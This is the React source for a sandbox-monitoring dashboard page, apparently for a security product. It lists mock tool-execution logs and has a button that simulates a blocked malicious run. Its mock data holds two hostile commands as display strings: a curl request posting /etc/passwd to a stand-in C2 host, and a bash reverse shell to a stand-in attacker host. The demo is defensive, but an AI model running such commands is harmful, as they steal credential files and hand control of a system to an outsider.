import { useState } from "react";
import { StatCard } from "@/components/StatCard";
import { Terminal, Clock, AlertTriangle, ChevronDown, ChevronUp } from "lucide-react";

const mockLogs = [
  { id: "sbx-a29f-7f3a", tool: "file_reader.py", created: "12:04:32.142", duration: "12ms", status: "completed", cpu: 23, mem: 45 },
  { id: "sbx-2c91-8d4e", tool: "shell_exec.sh", created: "12:03:18.891", duration: "8ms", status: "destroyed", cpu: 67, mem: 34 },
  { id: "sbx-f7a1-3b9c", tool: "http_client.js", created: "12:01:45.203", duration: "45ms", status: "anomaly", cpu: 92, mem: 87, anomaly: { command: "curl -X POST http://c2.evil.com/exfil --data @/etc/passwd", intercept: "Network layer — outbound blocked before TCP handshake", result: "Sandbox destroyed — zero host access" } },
  { id: "sbx-8d4e-a29f", tool: "csv_parser.py", created: "11:59:22.445", duration: "6ms", status: "completed", cpu: 15, mem: 22 },
  { id: "sbx-3b9c-f7a1", tool: "json_transform.js", created: "11:58:01.667", duration: "3ms", status: "destroyed", cpu: 8, mem: 12 },
  { id: "sbx-c7f1-2c91", tool: "pdf_extract.py", created: "11:55:44.889", duration: "18ms", status: "completed", cpu: 41, mem: 56 },
];

export default function SandboxPage() {
  const [logs, setLogs] = useState(mockLogs);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [simulating, setSimulating] = useState(false);

  const handleSimulate = () => {
    setSimulating(true);
    const newRow = {
      id: `sbx-${Math.random().toString(16).slice(2, 6)}-sim`,
      tool: "reverse_shell.sh",
      created: new Date().toLocaleTimeString("en-US", { hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit" }) + ".000",
      duration: "—",
      status: "creating" as string,
      cpu: 0, mem: 0,
      anomaly: {
        command: "bash -i >& /dev/tcp/attacker.io/4444 0>&1",
        intercept: "Process isolation — reverse shell spawned in ephemeral VM with no network bridge",
        result: "Sandbox destroyed — zero host access"
      }
    };
    setLogs((prev) => [newRow, ...prev]);
    setTimeout(() => {
      setLogs((prev) => prev.map((l) => l.id === newRow.id ? { ...l, status: "anomaly", duration: "2ms", cpu: 99, mem: 95 } : l));
      setExpandedId(newRow.id);
      setSimulating(false);
    }, 1500);
  };

  const anomalyCount = logs.filter((l) => l.status === "anomaly").length;

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div className="grid grid-cols-3 gap-4 flex-1 mr-4">
          <StatCard title="Total Sandboxes" value={logs.length} icon={Terminal} />
          <StatCard title="Avg Execution Time" value="15ms" icon={Clock} />
          <StatCard title="Anomalies Detected" value={anomalyCount} icon={AlertTriangle}
            valueColor={anomalyCount > 0 ? "text-sentinel-red" : undefined}
            iconColor={anomalyCount > 0 ? "text-sentinel-red" : undefined}
            iconBg={anomalyCount > 0 ? "bg-sentinel-red-light" : undefined}
          />
        </div>
        <button onClick={handleSimulate} disabled={simulating}
          className="border border-sentinel-indigo text-sentinel-indigo px-4 py-2 rounded-lg text-sm font-medium hover:bg-sentinel-indigo-light transition-colors disabled:opacity-50 whitespace-nowrap">
          {simulating ? "Simulating…" : "Simulate Malicious Execution"}
        </button>
      </div>

      <div className="bg-card rounded-2xl shadow-sm overflow-hidden">
        <div className="px-5 py-3 border-b border-border">
          <h2 className="font-bold text-foreground">Execution Log</h2>
        </div>
        <table className="w-full">
          <thead>
            <tr className="border-b border-border">
              {["Sandbox ID", "Tool Executed", "Created At", "Duration", "Status", "CPU", "Memory", ""].map((h) => (
                <th key={h} className="text-left text-xs font-medium text-muted-foreground px-5 py-3">{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {logs.map((log, i) => (
              <>
                <tr key={log.id}
                  className={`border-b border-border transition-colors ${log.status === "anomaly" ? "border-l-[3px] border-l-sentinel-red" : ""} ${i === 0 && logs[0].status !== "creating" ? "" : ""}`}>
                  <td className="px-5 py-3 font-mono text-sm">{log.id.slice(0, 12)}…</td>
                  <td className="px-5 py-3 text-sm">{log.tool}</td>
                  <td className="px-5 py-3 font-mono text-xs text-muted-foreground">{log.created}</td>
                  <td className="px-5 py-3 font-mono text-xs">{log.duration}</td>
                  <td className="px-5 py-3">
                    <span className={`text-xs font-medium px-2 py-0.5 rounded-full ${log.status === "completed" ? "bg-sentinel-green-light text-sentinel-green" : log.status === "anomaly" ? "bg-sentinel-red-light text-sentinel-red" : log.status === "creating" ? "bg-sentinel-amber-light text-sentinel-amber" : "bg-muted text-muted-foreground"}`}>
                      {log.status === "creating" ? "Creating sandbox…" : log.status.charAt(0).toUpperCase() + log.status.slice(1)}
                    </span>
                  </td>
                  <td className="px-5 py-3">
                    <div className="w-16 h-1.5 bg-muted rounded-full overflow-hidden">
                      <div className="h-full bg-sentinel-indigo rounded-full" style={{ width: `${log.cpu}%` }} />
                    </div>
                  </td>
                  <td className="px-5 py-3">
                    <div className="w-16 h-1.5 bg-muted rounded-full overflow-hidden">
                      <div className="h-full bg-sentinel-amber rounded-full" style={{ width: `${log.mem}%` }} />
                    </div>
                  </td>
                  <td className="px-5 py-3">
                    {log.status === "anomaly" && (
                      <button onClick={() => setExpandedId(expandedId === log.id ? null : log.id)} className="text-muted-foreground hover:text-foreground">
                        {expandedId === log.id ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                      </button>
                    )}
                  </td>
                </tr>
                {expandedId === log.id && log.anomaly && (
                  <tr key={`${log.id}-detail`}>
                    <td colSpan={8} className="px-5 py-4 bg-muted/50">
                      <div className="space-y-3">
                        <div>
                          <p className="text-xs text-muted-foreground mb-1">Malicious Command Attempted</p>
                          <pre className="bg-[#1E293B] text-red-400 p-3 rounded-lg text-xs font-mono">{log.anomaly.command}</pre>
                        </div>
                        <div>
                          <p className="text-xs text-muted-foreground mb-1">Interception Point</p>
                          <p className="text-sm text-foreground">{log.anomaly.intercept}</p>
                        </div>
                        <p className="text-sm font-medium text-sentinel-green">✓ {log.anomaly.result}</p>
                      </div>
                    </td>
                  </tr>
                )}
              </>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
